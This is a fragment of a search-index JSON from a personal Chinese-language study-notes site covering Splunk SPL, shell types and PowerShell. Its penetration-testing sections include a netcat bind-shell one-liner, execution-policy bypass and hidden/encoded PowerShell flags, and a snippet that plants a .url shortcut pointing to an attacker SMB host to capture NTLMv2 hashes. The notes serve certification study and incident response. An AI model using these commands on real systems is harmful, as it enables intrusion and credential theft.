head\u4e0a\u8fd0\u884c\uff0c\u5bf9\u6bcf\u4e2aevent\u5e94\u7528transformation\u3002\u5982\uff1atransaction\u3001head\u3001dedup\u3001streamstats\uff0c\u4ee5\u53ca\u5728Transforming\u547d\u4ee4\u540e\u7684\u6240\u6709\u547d\u4ee4\u3002</li> </ul> </li> <li>Transforming\uff1a\u5728search head\u4e0a\u8fd0\u884c\uff0c\u5c06\u7ed3\u679c\u8f6c\u6362\u4e3a\u6570\u636e\u8868\u7684\u547d\u4ee4\u3002\u5982\u7edf\u8ba1\u7c7b\u3002</li> </ul>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/Splunk%E7%9F%A5%E8%AF%86%E7%82%B9/#3_1","title":"\u52a0\u901f\u76843\u79cd\u521b\u5efa\u65b9\u6cd5","text":"<ol> <li>Report acceleration\uff1a\u7528\u81ea\u52a8\u521b\u5efa\u7684summaries\uff0c\u7f29\u77ed\u7279\u5b9a\u79cd\u7c7b\u7684Report\u641c\u7d22\u65f6\u95f4\u3002</li> <li>Summary indexing\uff1a\u624b\u52a8\u521b\u5efa\u3002\u4ec5\u63a8\u8350\u7528\u4e8e\u65e0\u6cd5\u9ad8\u901f\u5316\u7684Report\uff08\u5373\u4e0b\u7b56\uff1f\uff09</li> <li>Data model acceleration\uff1a\u52a0\u901f\u5728\u6570\u636e\u6a21\u578b\u4e2d\u7684\u6240\u6709\u5b57\u6bb5\u3002\u7b80\u5355\uff0c\u9996\u9009\u3002</li> </ol>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/Splunk%E7%9F%A5%E8%AF%86%E7%82%B9/#1-report-accelerationreport","title":"1. Report acceleration\uff08\u5373\u4fdd\u5b58\u641c\u7d22\u4e3aReport\uff0c\u5e76\u9700\u8981\u542f\u52a8\u9ad8\u901f\u5316\uff09","text":"<ul> <li>\u4fdd\u5b58\uff1a\u5176\u9ad8\u901f\u5316Summary\u57fa\u672c\u4e0a\u6bcf10\u5206\u949f\u66f4\u65b0\u5e76\u5c06\u6700\u8fd1\u641c\u7d22\u7ed3\u679c\u5206\u522b\u4fdd\u5b58\u4e3a\u5404\u4e2afile chunk\uff0c\u5e76\u4e0e\u4e00\u8d77\u4fdd\u5b58\u5728index\u7684bucket\u4e2d</li> <li>bucket\uff1aindex\u7684\u76ee\u5f55\u6784\u9020\u3002\u6839\u636e\u6570\u636e\u9c9c\u5ea6\u5206\u4e3aHot/Warm/Cold\u7b49\u3002\u5176\u4e2dHot/Warm\u4e3aSSD\u786c\u76d8\uff0c\u800cCold\u4e3a\u4e00\u822c\u786c\u76d8\u3002\uff08\u5177\u4f53\u53c2\u7167\uff1aHowSplunkstoresindexes\uff09</li> <li>\u9700\u8981\u6743\u9650\uff1a<code>schedule_search</code>\u3002\uff08\u5bf9\u4e8ePower\u548cAdmin\uff0c\u9ed8\u8ba4\u5c31\u6709\uff09</li> </ul> <p>[!NOTE] Report acceleration\u5fc5\u987b\u5305\u542bTransforming\u547d\u4ee4 \u4e14Transforming\u547d\u4ee4\u524d\u4e0d\u80fd\u4f7f\u7528Non-streaming\u547d\u4ee4\u2014\u2014\u8981\u4f7f\u7528distributable streaming\u547d\u4ee4\u3002</p>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/Splunk%E7%9F%A5%E8%AF%86%E7%82%B9/#3-data-model-acceleration","title":"3. Data model acceleration","text":"<p>\u4e24\u79cd\u7c7b\u578b\uff1a</p> <ul> <li>Adhoc\uff1a<code>\u9ad8\u901f\u5316\u751f\u6210\u7684\u6587\u4ef6</code>\u4e34\u65f6\u4fdd\u5b58\u5728search head\u3002<ul> <li>\u4e34\u65f6\uff1a\u7528\u6237\u4f7f\u7528pivot editor\u671f\u95f4</li> </ul> </li> <li>Persistent\uff1a<code>\u9ad8\u901f\u5316\u751f\u6210\u7684\u6587\u4ef6</code>\u6c38\u4e45\u4fdd\u5b58\u5728indexer<ul> <li>\u9700\u8981\u6743\u9650\uff1a<code>accelerate_datamodel</code>\uff0c\u6216admin\uff08\u6ce8\u610f\u6ca1\u6709power user\uff09</li> <li>\u5fc5\u987b\u53ea\u80fd\u4f7f\u7528Streaming\u547d\u4ee4</li> </ul> </li> </ul> <p>\u7f16\u8f91\u9ad8\u901f\u5316\u9009\u62e9\u65f6\u95f4\u8303\u56f4\u540e\uff0c\u9ad8\u7ea7\u8bbe\u7f6e\u4e00\u822c\u4e0d\u52a8\u3002\u9664\u975e\u9ad8\u901f\u5316\u62a5\u9519\u3002</p>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/Splunk%E7%9F%A5%E8%AF%86%E7%82%B9/#tsidx-filestime-series-index-files","title":"\u9ad8\u901f\u5316\u751f\u6210\u7684\u6587\u4ef6\uff1aTsidx Files\uff08Time-Series Index Files\uff09","text":"<p>Splunk\u77e5\u8bc6\u70b9#\u7d22\u5f15\u50a8\u5b58\u7684\u903b\u8f91\u2014\u2014\u5206\u7247\uff08TERM\u7406\u89e3\uff09</p> <p>\u5f53\u6570\u636e\u5b58\u50a8\u5230splunk\u65f6\uff08index\u5316\u65f6\uff09\uff0c\u4f1a\u5c06raw data\u548cTsidx\u6587\u4ef6\u5b58\u5230HOT bucket\u3002 \u6bcf5\u5206\u949f\u66f4\u65b0\uff0c\u6bcf30\u5206\u949f\u5220\u9664\u8fc7\u671f\u3002</p> <p>Tsidx\u6587\u4ef6\u4e3b\u8981\u6709\u4e24\u90e8\u5206\uff1a</p> <ul> <li><code>Lexicon</code>\u5217\u8868\uff1a\u5b58\u50a8\u4e86\u5728data\u4e2d\u627e\u5230\u7684term\uff0c\u7528\u5b57\u6bcd\u8868\u987a\u5e8f\u6392\u5217\u3002\u4e14index\u5316\u65f6\u4f1a\u5c06\u5404\u5b57\u6bb5\u540d\u548c\u503c\u5b58\u50a8\u4e3a\u952e\u503c\u5bf9\u5f62\u5f0f\u3002</li> <li><code>Posting</code>\u5217\u8868\uff1a\u5b58\u50a8\u4e86\u6bcf\u4e2aterm\u4e0eraw data\u7684\u5bf9\u5e94\u6307\u9488</li> </ul> <p>SPL memo#datamodel SPL memo#tstat</p>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/Splunk%E7%9F%A5%E8%AF%86%E7%82%B9/#time","title":"time","text":"<p><code>_time</code> \u5b57\u6bb5\uff08timestamp\uff09\u5b9e\u9645\u5b58\u50a8\u7684\u662funix\u65f6\u95f4\uff0c\u3002\u5728log\u4e00\u680f\u754c\u9762\u5e76\u53ef\u663e\u793a\u4e3a\u8d26\u53f7\u8bbe\u7f6e\u7684\u672c\u5730\u65f6\u533a\uff08\u4e0elog\u8be6\u7ec6\u4e2d\u7684\u65f6\u533a\u4e0d\u4e00\u5b9a\u4e00\u6837\uff09\u3002</p>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/Splunk%E7%9F%A5%E8%AF%86%E7%82%B9/#earliestlatest","title":"earliest&amp;latest","text":"<p>@timeUnit\uff1around down (look back) to the nearest specified unit.</p> <ul> <li>@timeUnit\u540e\u9762\u4e5f\u53ef\u4ee5 +/- \u6765\u79fb\u52a8\u65f6\u95f4\u3002\u5982\uff1a<code>@d+3h</code></li> </ul>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/Splunk%E7%9F%A5%E8%AF%86%E7%82%B9/#timeunit","title":"timeUnit\u603b\u7ed3","text":"<ul> <li>\u90fd\u662f\u5c0f\u5199</li> <li>\u5355\u590d\u6570\u6ca1\u533a\u522b</li> <li>\u6708\u4efd\u662fmon\u3001month\u3001months\uff0c\u800c\u4e0d\u662fm\uff08\u5206\u949f\uff09</li> </ul>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/Splunk%E7%9F%A5%E8%AF%86%E7%82%B9/#date_","title":"\u9ed8\u8ba4\u65f6\u95f4\u5b57\u6bb5\uff08<code>date_*</code>\uff09","text":"<ul> <li>zone</li> <li>year</li> <li>month</li> <li>mday</li> <li>wday</li> <li>hour</li> <li>minute</li> <li>second</li> </ul> <p>\u662f\u4eceraw data\u7684 timestamp \u4e2d\u63d0\u53d6\u7684\u3002\u5373\u5982\u679c\u6ca1\u6709timestamp\u5c31\u4e0d\u4f1a\u63d0\u53d6\u2014\u2014\u800c\u8fd9\u4e9bdata\u7684timestamp\u4e3aindex\u7684\u65f6\u95f4\u3002</p> <p>[!NOTE] \u8fd9\u4e9b\u5b57\u6bb5\u4e0d\u4f1a\u8003\u8651\u8ba1\u7b97\u7528\u6237\u7684\u65f6\u533a\u914d\u7f6e\uff08\u56e0\u4e3a\u662f\u4eceraw data\u7684timestamp\u5206\u9694\u5f97\u6765\u7684\uff09 \u6240\u4ee5\uff1a\u7b5b\u9009\u6570\u636e\u65f6\u53ef\u5148\u7528 <code>strftime(_time, \"%H\")</code> \u83b7\u53d6\u7528\u6237\u672c\u5730\u65f6\u533a\u7684\u65f6\u95f4\u3002\uff08\u5373strftime\u4f1a\u8003\u8651\u65f6\u533a\u2014\u2014\u641c\u7d22\u7ed3\u679c\u7684\u65f6\u95f4\u5217\u4e5f\u662f\u7528\u8fd9\u4e2a\u51fd\u6570\u8fdb\u884c\u8f6c\u5316\u5e76\u5c55\u793a\u7684\uff09</p> <p>SPL memo#bin SPL memo#relative_time SPL memo#\u683c\u5f0f\u5316</p>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/Splunk%E7%9F%A5%E8%AF%86%E7%82%B9/#_2","title":"\u641c\u7d22\u6a21\u5f0f","text":"<p><code>\u667a\u80fd\u6a21\u5f0f</code>\u7684\u641c\u7d22\u884c\u4e3a\u53d6\u51b3\u4e8e\u4f60\u7684\u641c\u7d22\u884c\u4e3a/\u7c7b\u578b\u2014\u2014\u5bf9\u4e8e\u8f6c\u6362\u641c\u7d22\uff0c\u5176\u884c\u4e3a\u7c7b\u4f3c\u4e8e<code>\u5feb\u901f\u6a21\u5f0f</code>\uff1b\u5bf9\u4e8e\u975e\u8f6c\u6362\u547d\u4ee4\u7684\u641c\u7d22\uff0c\u5176\u884c\u4e3a\u7c7b\u4f3c\u4e8e<code>\u8be6\u7ec6\u6a21\u5f0f</code>\u3002</p>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/Splunk%E7%9F%A5%E8%AF%86%E7%82%B9/#_3","title":"\u7edf\u8ba1\u5904\u7406","text":"","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/Splunk%E7%9F%A5%E8%AF%86%E7%82%B9/#3data-series","title":"3\u7c7bData Series","text":"<ul> <li>single-series</li> <li>multi-series\uff08\u5c06single\u7684x\u8f74\u7684\u503c\u7528by\u5206\u7ec4\u663e\u793a\uff09</li> <li>time-series\uff08\u53ef\u4ee5\u662fsingle\u6216multi\uff09</li> </ul>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/Splunk%E7%9F%A5%E8%AF%86%E7%82%B9/#chart","title":"chart","text":"<p>\u53ef\u7528over\u521b\u5efasingle-series\uff0c\u7528by\u521b\u5efamulti-series\u3002 chart\u4ec5\u80fd\u8ddf\u4e24\u4e2a\u5b57\u6bb5\u53c2\u6570\u2014\u2014\u5373x\u3001y\u8f74\u3002</p> <ul> <li>limit=0\uff1a\u65e0\u9650\u5236</li> <li>useother=f</li> <li>usenull=f</li> <li>span\uff1a\u5982\u679cx\u8f74\u662f\u6570\u5b57\uff0c\u53ef\u4e3ax\u8f74\u5206\u7ec4</li> </ul>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/Splunk%E7%9F%A5%E8%AF%86%E7%82%B9/#timechart","title":"timechart","text":"","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/Splunk%E7%9F%A5%E8%AF%86%E7%82%B9/#top","title":"top","text":"","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/Splunk%E7%9F%A5%E8%AF%86%E7%82%B9/#rare","title":"rare","text":"","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/Splunk%E7%9F%A5%E8%AF%86%E7%82%B9/#spl-memostats","title":"SPL memo#stats","text":"<p>4\u7c7b\u51fd\u6570\uff1a</p> <ul> <li>Aggregate\uff1a\u5982count\u3001sum\u3001dc\u3002</li> <li>Event Order</li> <li>Multivalue\uff1a\u5982list\u3001value\u3002list\u662f\u5217\u51fa\u6240\u6709\u503c\uff0cvalue\u662f\u5217\u51fa\u552f\u4e00\u503c</li> <li>Time</li> </ul>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/Splunk%E7%9F%A5%E8%AF%86%E7%82%B9/#spl-memoeval-functions","title":"SPL memo#eval-functions\u8be6\u89e3","text":"<p>11\u7c7b\u51fd\u6570\u3002 eval\u81ea\u5df1\u5728stats\u4e2d\u4e5f\u80fd\u5f53\u505a\u51fd\u6570\u3002\u5982<code>| stats count(eval(X=YY))</code>\u3002\u6ce8\u610f\uff0c\u8fd9\u4f3c\u4e4e\u4e0d\u662f\u8868\u793a\u8d4b\u503c\uff0c\u800c\u662f\u76f8\u5f53\u4e8ewhere\uff1f\uff1f</p>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/Splunk%E7%9F%A5%E8%AF%86%E7%82%B9/#rename","title":"rename","text":"<p>\u7adf\u7136\u53ef\u4ee5\u7528\u901a\u914d\u7b26</p>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/Splunk%E7%9F%A5%E8%AF%86%E7%82%B9/#sort","title":"sort","text":"<p>\u5bf9\u4e8e\u5b57\u6bcd\uff1asorted lexicographically\uff08\u6309\u5b57\u5178\u987a\u5e8f\uff09\u2014\u2014\u6240\u4ee5\u5927\u5199\u5728\u5c0f\u5199\u524d\u9762\u3002 \u53ef\u4ee5\u6bcf\u5217\u5e94\u7528\u4e0d\u540c\u6392\u5e8f\uff08\u5982\u7b2c\u4e00\u5217\u5347\u7b2c\u4e8c\u5217\u964d\uff09</p>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"Resources/Shell/","title":"Shell","text":"<p>On a Linux system, the shell is a program that takes input from the user via the keyboard and passes these commands to the operating system to perform a specific function. In the early days of computing, the shell was the only interface available for interacting with systems. Since then, many more operating system types and versions have emerged along with the graphic user interface (GUI) to complement command-line interfaces (shell), such as the Linux terminal, Windows command-line (cmd.exe), and Windows PowerShell.</p> <p>Every operating system has a shell, and to interact with it, we must use an application known as a\u00a0<code>terminal emulator</code>. Here are some of the most common terminal emulators:</p> <ul> <li>PuTTY</li> <li>xterm</li> <li>\u7b49</li> </ul> <p>which has been pre-configured to use a <code>command language interpreter</code>, a program working to interpret the instructions provided by the user and issue the tasks to the operating system for processing.</p> <ul> <li>\u5373bash\u3001PowerShell\u7b49\uff0cshell\u662f\u547d\u4ee4\u89e3\u91ca\u5668\u7684\u4e00\u4e2a\u5177\u4f53\u4f8b\u5b50\u3002\u5176\u4ed6\u6bd4\u5982\u8fd8\u6709python\u89e3\u91ca\u5668\u7b49\u3002</li> <li>\u5f53\u5728\u7ec8\u7aef\u968f\u4fbf\u8f93\u5165\u547d\u4ee4\u7136\u540e\u88ab\u63d0\u793a\u627e\u4e0d\u5230\u547d\u4ee4\u65f6\uff0c\u53ef\u4ee5\u8bf4\u660e\u5176\u4e0d\u5728\u89e3\u91ca\u5668\u7684\u547d\u4ee4\u96c6\u4e2d\u3002</li> </ul>","tags":["\u6e17\u900f/CPTS","IT/Linux"]},{"location":"Resources/Shell/#_1","title":"\u79cd\u7c7b","text":"Shell Type Description <code>Reverse shell</code>\u53cd\u5f39shell Initiates a connection back to a \"listener\" on our attack box. <code>Bind shell</code> \"Binds\" to a specific port on the target host and waits for a connection from our attack box. <code>Web shell</code> Runs operating system commands via the web browser, typically not interactive or semi-interactive. It can also be used to run single commands (i.e., leveraging a file upload vulnerability and uploading a\u00a0<code>PHP</code>\u00a0script to run a single command.","tags":["\u6e17\u900f/CPTS","IT/Linux"]},{"location":"Resources/Shell/#bind-shell","title":"Bind shell","text":"<p>\u7528<code>nc</code>\u5efa\u7acbTCP\u4f1a\u8bdd\u8fde\u63a5\u540e\u53ef\u53d1\u9001\u6587\u672c\uff0c\u4f46\u5e76\u4e0d\u662f\u7ed1\u5b9ashell\uff0c\u56e0\u4e3a\u6211\u4eec\u65e0\u6cd5\u4e0e\u64cd\u4f5c\u7cfb\u7edf\u548c\u6587\u4ef6\u7cfb\u7edf\u4ea4\u4e92\u3002</p> <p>\u5efa\u7acb\u7ed1\u5b9ashell\uff1a <pre><code>Target@server:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc -l 10.129.41.200 7777 &gt; /tmp/f\n\n# Client - Connecting to bind shell on target\nTimeLess613@htb[/htb]$ nc -nv 10.129.41.200 7777\nTarget@server:~$  \n</code></pre></p>","tags":["\u6e17\u900f/CPTS","IT/Linux"]},{"location":"Resources/Shell/#reverse-shells","title":"Reverse Shells","text":"<p>\u53cd\u5f39shell</p> <p>CPTS\u4e2dPowerShell\u53cd\u5f39shell\u7528\u7684https://www.revshells.com/\u7684<code>PowerShell#2</code>\u3002</p>","tags":["\u6e17\u900f/CPTS","IT/Linux"]},{"location":"Resources/Shell/#tricks","title":"tricks","text":"<p>\u5173\u4e8e\u4e3a\u4ec0\u4e48\u4f7f\u7528<code>bash -c</code>\uff1a\u5355\u884c\u4ee3\u7801\u4e2d\u6709\u4e9b\u8bed\u6cd5<code>sh</code>\u4e0d\u652f\u6301\uff0c\u6240\u4ee5\u542f\u52a8\u4e00\u4e2a<code>bash</code>\u5305\u88c5\u8fd9\u884c\u547d\u4ee4 </p>","tags":["\u6e17\u900f/CPTS","IT/Linux"]},{"location":"Resources/powershell/","title":"PowerShell","text":"","tags":["IT/Windows","\u6e17\u900f"]},{"location":"Resources/powershell/#_1","title":"\u6267\u884c\u7b56\u7565","text":"<p>\u4ec5\u5bf9\u811a\u672c\u3002\u547d\u4ee4\u4e0d\u53d7\u6b64\u9650\u5236\u3002</p> <ul> <li>Restricted\uff1a\u9ed8\u8ba4\uff0c\u4e0d\u80fd\u8fd0\u884c\u811a\u672c</li> <li>RemoteSigned\uff1a\u672c\u5730\u521b\u5efa\u7684\u811a\u672c\u53ef\u4ee5\u8fd0\u884c\uff1b\u5bf9\u4e8e\u7f51\u4e0a\u4e0b\u8f7d\u7684\u811a\u672c\uff0c\u5982\u679c\u6709\u53d7\u4fe1\u4efb\u53d1\u5e03\u8005\u7684\u6570\u5b57\u7b7e\u540d\u5219\u53ef\u8fd0\u884c</li> <li>AllSigned\uff1a\u5982\u679c\u811a\u672c\u6709\u53d7\u4fe1\u4efb\u53d1\u5e03\u8005\u7684\u6570\u5b57\u7b7e\u540d\u5219\u53ef\u8fd0\u884c</li> <li>Unrestricted\uff1a\u4e0d\u53d7\u9650\u5236\uff08\u5373\u4e0d\u7ba1\u6765\u81ea\u54ea\u91cc\u3001\u4e0d\u7ba1\u662f\u5426\u6709\u7b7e\u540d\uff09</li> </ul> <p>\u76f8\u5173\u547d\u4ee4\uff1a</p> <ul> <li>\u67e5\u770b\u5f53\u524d\u7b56\u7565\uff1a<code>Get-ExecutionPolicy</code></li> <li>\u4fee\u6539\u7b56\u7565\uff1a<code>Set-ExecutionPolicy &lt;policy-name&gt;</code>\u3002\u9700\u8981\u7ba1\u7406\u5458\u6743\u9650\uff08\u4e00\u822c\u6ca1\u5fc5\u8981\u7528\u8fd9\u4e2a\uff0c\u76f4\u63a5\u770b\u4e0b\u9762\u7684\u547d\u4ee4\u2193\uff09</li> <li>\u7ed5\u8fc7\uff1a<code>powershell (-ep bypass | -exec bypass)</code></li> </ul>","tags":["IT/Windows","\u6e17\u900f"]},{"location":"Resources/powershell/#flag","title":"\u53c2\u6570\u9009\u9879flag","text":"<ul> <li>\u53ef\u4ee5\u7528\u77ed\u6a2a\u6760(-)</li> <li>\u4e5f\u53ef\u4ee5\u7528\u659c\u6760(/)\uff0c\u5b9e\u9645\u4e0a\u662fcmd\u547d\u4ee4\u7684\u53c2\u6570</li> </ul>","tags":["IT/Windows","\u6e17\u900f"]},{"location":"Resources/powershell/#powershell","title":"powershell\u7684\u63a5\u5934\u8bcd","text":"","tags":["IT/Windows","\u6e17\u900f"]},{"location":"Resources/powershell/#whereselect","title":"where\u5bf9\u8c61\u4e0eselect\u5bf9\u8c61","text":"","tags":["IT/Windows","\u6e17\u900f"]},{"location":"Resources/powershell/#_2","title":"\u7b80\u5199","text":"<ul> <li><code>Where-Object</code>\u7684\u7b80\u5199\uff1a<code>?</code>\u3002\u5982\u7528\uff1a<code>| ?</code></li> <li><code>Select-Object</code>\u7684\u7b80\u5199\uff1a<code>select</code>\u3002\u5982\u7528\uff1a<code>| select</code></li> </ul>","tags":["IT/Windows","\u6e17\u900f"]},{"location":"Resources/powershell/#_3","title":"\u5b9e\u7528\u547d\u4ee4","text":"","tags":["IT/Windows","\u6e17\u900f"]},{"location":"Resources/powershell/#_4","title":"\u73af\u5883\u53d8\u91cf","text":"<p>\u67e5\u770b\uff1a</p> <ul> <li><code>gci $env:*</code></li> <li><code>ls env:</code></li> <li><code>$env:userprofile</code></li> </ul> <p>[[cmd#\u73af\u5883\u53d8\u91cf]]</p> <p>hacktricks: Basic PowerShell for Pentesters</p>","tags":["IT/Windows","\u6e17\u900f"]},{"location":"Resources/powershell/#_5","title":"\u57fa\u7840","text":"<pre><code>## --help\nGet-Help *                      #List everything loaded\nGet-Help process                #List everything containing \"process\"\nGet-Help Get-ChildItem -Parameter *\nGet-Help Get-Item -Full         #Get full helpabout a topic\nGet-Help Get-Item -Examples     #List examples\n\n## cat\nGet-Content\n## ls\nGet-ChildItem\n## find\nGet-ChildItem -r -Filter \"*.txt\"    \n    -File\n    -Directory\n\nGet-Process | Get-Member\nGet-Process | Select-Object -Property ProcessName, ID, StartTime\n\nGet-Alias iex\n\n\n# \u786e\u8ba4\u8be6\u7ec6\u4fe1\u606f\n... | Format-List\n## \u7f29\u5199\n... | fl\n</code></pre>","tags":["IT/Windows","\u6e17\u900f"]},{"location":"Resources/powershell/#acl","title":"\u67e5\u770b[[ACL]]","text":"<p><code>Get-Acl &lt;directory_path&gt; | fl</code></p>","tags":["IT/Windows","\u6e17\u900f"]},{"location":"Resources/powershell/#_6","title":"\u6587\u672c\u5904\u7406","text":"<pre><code>gc log.txt -head 10\ngc log.txt | select -first 10    ## head\ngc -TotalCount 10 log.txt        ## also head\ngc log.txt | select -last 10     ## tail\ngc -tail 10 log.txt              ## also tail (since PSv3), also much faster than above option\ngc log.txt -tail 10 -wait        ## equivalent to tail -f\ngc log.txt | more                ## or less if you have it installed\n\n\ngc log.txt | %{ $_ -replace '\\d+', '($0)' }    ## sed\n</code></pre>","tags":["IT/Windows","\u6e17\u900f"]},{"location":"Resources/powershell/#_7","title":"\u6e17\u900f","text":"","tags":["IT/Windows","\u6e17\u900f"]},{"location":"Resources/powershell/#_8","title":"\u4e0a\u4f20","text":"<p>FileTransfers-Windows#Upload</p>","tags":["IT/Windows","\u6e17\u900f"]},{"location":"Resources/powershell/#_9","title":"\u4e0b\u8f7d","text":"<p>FileTransfers-Windows#Download</p>","tags":["IT/Windows","\u6e17\u900f"]},{"location":"Resources/powershell/#_10","title":"\u5386\u53f2\u547d\u4ee4","text":"<ul> <li>\u67e5\u770b\u4fdd\u5b58\u5386\u53f2\u547d\u4ee4\u7684\u6587\u4ef6\uff1a<code>(Get-PSReadlineOption).HistorySavePath</code></li> <li>\u67e5\u770b\u5386\u53f2\u547d\u4ee4\uff1a<code>Get-Content C:\\Users\\&lt;USERNAME&gt;\\AppData\\Roaming\\Microsoft\\Windows\\Powershell\\PSReadline\\ConsoleHost_history.txt</code></li> </ul>","tags":["IT/Windows","\u6e17\u900f"]},{"location":"Resources/powershell/#ntlmv2","title":"NTLMv2\u7a83\u53d6","text":"<p>scf\u6587\u4ef6</p> <p>web\u5feb\u6377\u65b9\u5f0f <pre><code>$url = \"file://10.10.14.46/share/test.hta\"; $shortcutPath = \"C:\\inetpub\\testing\\test.url\"; $shortcutContent = \"[InternetShortcut]`r`nURL=$url\"; Set-Content -Path $shortcutPath -Value $shortcutContent\n</code></pre></p> <ul> <li><code>file://</code>\u7684\u8bdd\u4f3c\u4e4e\u9700\u8981\u5f00\u542fSMB\u670d\u52a1\u3002</li> </ul>","tags":["IT/Windows","\u6e17\u900f"]},{"location":"Resources/powershell/#_11","title":"\u4e8b\u4ef6\u8c03\u67e5\u65f6","text":"<p>\u300a\u8be6\u89e3 \u4e8b\u4ef6\u54cd\u5e94\u300bP96</p>","tags":["IT/Windows","\u6e17\u900f"]},{"location":"Resources/powershell/#_12","title":"\u91cd\u8981\u53c2\u6570","text":"<ul> <li><code>-NoProfile</code>\uff08<code>-NoP</code>\uff09\uff1a\u4e0d\u52a0\u8f7d\u5f53\u524d\u7528\u6237\u7684\u914d\u7f6e\u3002</li> <li><code>-NonInteractive</code>\uff08<code>-NonI</code>\uff09\uff1a\u5b83\u663e\u793a\u7a97\u53e3\uff0c\u53ea\u662f\u7981\u7528\u4ea4\u4e92\u3002</li> <li><code>-w Hidden</code>\uff1a<code>WindowStyle='Hidden'</code></li> <li><code>-c</code>\uff1a<code>-Command</code><ul> <li>\u5173\u4e8e\u5355\u5f15\u53f7\u5185\u4e0d\u80fd\u7528\u53cc\u5f15\u53f7\u800c\u8981\u7528\u4e24\u4e2a\u5355\u5f15\u53f7\u2014\u2014\u5728\u5355\u5f15\u53f7\u5185\u8981\u8f93\u51fa\u4e00\u4e2a\u5355\u5f15\u53f7\u5c31\u8981\u7528\u4e24\u4e2a\u5355\u5f15\u53f7\u2014\u2014\u76f8\u5f53\u4e8e\u5355\u5f15\u53f7\u7528\u6765\u8f6c\u4e49\u3002\u4e0b\u56fe\u4f8b\uff1a </li> </ul> </li> <li><code>-noexit</code>\uff1a\u6267\u884c\u540e\u4e0d\u9000\u51fa\u3002\u5bf9\u4e8e\u5982\u952e\u76d8\u8bb0\u5f55\u7b49\u811a\u672c\u6765\u8bf4\u5f88\u91cd\u8981\uff0c\u56e0\u6b64\u8fd9\u4e9b\u811a\u672c\u5f97\u4ee5\u6301\u7eed\u6267\u884c</li> <li><code>-enc</code>\uff08<code>-e</code>\uff09\uff1a\u6267\u884c\u7f16\u7801\u5b57\u7b26\u3002\uff08\u76f8\u5bf9\u4e8e-c\u5219\u662f\u6267\u884c\u5355\u7eaf\u5b57\u7b26\uff09<ul> <li>\u5176base64\u7f16\u7801\u4ec5\u652f\u6301UTF-16LE\uff08\u201cUnicode\u201d\uff09\u5b57\u7b26\u4e32\uff0c\u4e0d\u652f\u6301utf-8\u3002\u3010\u56e0\u4e3a\u901a\u5e38powershell\u7684\u9ed8\u8ba4\u7f16\u7801\u662fUnicode UTF-16LE\u3011</li> <li>\u8f6cbase64\uff08UTF-16LE\uff09\uff1a<ul> <li>\u5728Windows\u8f6cbase64\uff08UTF-16LE\uff09\u7684\u547d\u4ee4\uff1a<code>[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('&lt;your command&gt;'))</code></li> <li>\u7528LINUX\u547d\u4ee4\uff08iconv\uff09\uff1a base64 -w 0</li> <li>\u7528CyberChef\uff1a </li> </ul> </li> </ul> </li> </ul> <p>https://redcanary.com/blog/investigating-powershell-attacks/</p>","tags":["IT/Windows","\u6e17\u900f"]},{"location":"Resources/powershell/#eventlog","title":"Eventlog\u76f8\u5173","text":"<p>log PATH: <code>C:\\Windows\\System32\\winevt\\Logs\\</code></p> <p>\u7528\u6237\u53ef\u4ee5\u901a\u8fc7\u4e09\u79cd\u4e3b\u8981\u65b9\u5f0f\u4ece Windows \u4f1a\u8bdd\u8bbf\u95ee\u4e8b\u4ef6\u65e5\u5fd7\u3002\u5b83\u4eec\u662f\uff1a</p> <ul> <li>\u56fe\u5f62 Windows \u4e8b\u4ef6\u67e5\u770b\u5668<code>eventvwr.msc</code></li> <li>\u547d\u4ee4\u884c<code>wevtutil.exe</code></li> <li>PowerShell cmdlet:\u00a0<code>Get-WinEvent</code></li> </ul>","tags":["IT/Windows","\u6e17\u900f"]},{"location":"Resources/powershell/#get-eventlog","title":"Get-Eventlog","text":"<p>\u3010 Get-EventLog \u3011\u30b3\u30de\u30f3\u30c9\u30ec\u30c3\u30c8\u2015\u2015Windows\u306e\u30a4\u30d9\u30f3\u30c8\u30ed\u30b0\u3092\u53d6\u5f97\u3059\u308b Get-Eventlog\u306e\u4f7f\u3044\u65b9\u304b\u3089\u899a\u3048\u3066\u3044\u304fPowershell\u306e\u57fa\u672c\u7684\u306a\u4f7f\u3044\u65b9</p> <p>[!NOTE] \u5c06\u88ab Get-WinEvent \u66ff\u4ee3 Application or Service log\u7684\u8bdd\u63a8\u8350\u7528<code>Get-WinEvent</code>\u3002</p> <ul> <li> <p><code>Get-EventLog \"Windows PowerShell\" -InstanceID 400 -After \"2022/12/21\" -Before \"2022/12/22\" | Export-Csv -Encoding Default $env:HOMEPATH\"\\Downloads\\powershellLog.csv\"</code></p> </li> <li> <p><code>Get-EventLog -List</code></p> </li> <li> <p><code>Get-EventLog [-LogName] &lt;\u30a4\u30d9\u30f3\u30c8\u30ed\u30b0\u540d&gt;</code></p> </li> <li> <p>\u4eceApplication\u7684log\u6307\u5b9a\u7b49\u7ea7\u6216ID\uff1a<code>Get-EventLog 